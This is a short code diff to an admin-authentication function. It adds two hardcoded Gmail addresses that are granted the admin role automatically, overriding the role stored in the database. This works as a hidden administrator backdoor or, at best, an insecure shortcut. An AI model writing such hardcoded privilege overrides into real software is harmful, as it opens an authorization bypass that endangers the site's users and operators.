@@ -60,6 +60,10 @@ async function authenticateAdmin(request, env) {
     );
     if (!rows || rows.length === 0) return null;
     const user = rows[0];
+    const adminEmails = ['tworksita@gmail.com', 'whatscrorg@gmail.com'];
+    if (user.email && adminEmails.includes(user.email.toLowerCase())) {
+      user.role = 'admin';
+    }
     if (user.role !== 'admin') return null;
     return user;
   } catch (e) {
